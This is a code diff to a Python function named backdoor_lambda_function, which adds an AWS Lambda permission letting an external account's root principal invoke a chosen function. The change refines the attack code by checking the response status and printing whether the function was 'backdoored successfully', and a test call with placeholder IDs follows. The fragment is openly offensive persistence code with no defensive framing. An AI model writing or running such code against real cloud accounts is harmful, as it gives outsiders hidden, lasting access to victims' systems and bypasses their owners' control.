@@ -8,9 +8,11 @@ def backdoor_lambda_function(function_name, external_account_id):
     Action='lambda:InvokeFunction',
     Principal='arn:aws:iam::' + external_account_id + ':root'
   )
+  if response['ResponseMetadata']['HTTPStatusCode'] == 201:
+    print("Lambda function backdoored successfully.")
+  else:
+    print("Failed to backdoor Lambda function.")
 
-
-print("Lambda function backdoored successfully.")
 
 # Test
 backdoor_lambda_function('my-function', '123456789012')
